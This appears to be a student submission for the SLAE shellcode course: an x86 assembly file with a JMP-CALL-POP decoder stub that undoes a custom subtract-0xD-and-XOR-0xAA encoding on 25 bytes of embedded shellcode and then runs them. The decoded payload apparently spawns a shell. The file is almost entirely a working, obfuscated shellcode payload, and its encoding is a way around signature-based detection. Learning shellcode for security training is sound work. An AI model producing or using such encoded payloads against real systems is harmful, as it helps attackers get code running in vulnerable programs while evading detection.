;Assignment # 4	
;SLAE-1122


global _start

section .text
_start:

;JMP-CALL-POP technique use for decode the shellcode 

jmp short call_shellcode
  
decoder:  
    
    pop esi                 
    xor ecx, ecx  
    mov cl, 25 ;Encoded shellcode length  
    
     
decode: 

    sub byte [esi], 0xD   ;ROT-13 Decode 
    xor byte [esi], 0xAA ;XOR AA Decode           
    inc esi  
    loop decode  
    jmp short shellcode

call_shellcode:  
    call decoder  
    shellcode: db  0xa8,0x77,0x07,0xcf,0x92,0x92,0xe6,0xcf,0xcf,0x92,0xd5,0xd0,0xd1,0x30,0x56,0x07,0x30,0x55,0x06,0x30,0x58,0x27,0xae,0x74,0x37
